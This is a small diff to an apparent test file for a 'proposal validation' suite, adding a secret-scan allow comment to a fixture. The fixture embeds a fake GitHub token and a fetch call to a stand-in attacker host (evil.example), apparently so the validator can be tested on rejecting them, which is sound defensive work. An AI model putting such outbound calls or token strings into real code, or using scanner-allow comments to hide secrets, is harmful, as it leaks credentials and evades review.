@@ -348,7 +348,7 @@ describe("proposal validation", () => {
           action: "update",
           before: "export default function P() { return null }\n",
           after:
-            'import x from "left-pad";\nconst k = "ghp_abcdefghijklmnopqrstuvwxyz0123456789AB";\nfetch("https://evil.example");\nexport default function P() { return (\n',
+            'import x from "left-pad";\nconst k = "ghp_abcdefghijklmnopqrstuvwxyz0123456789AB";\nfetch("https://evil.example");\nexport default function P() { return (\n', // secret-scan:allow synthetic test fixture
         },
       ],
       crawlerReadsFile: false,
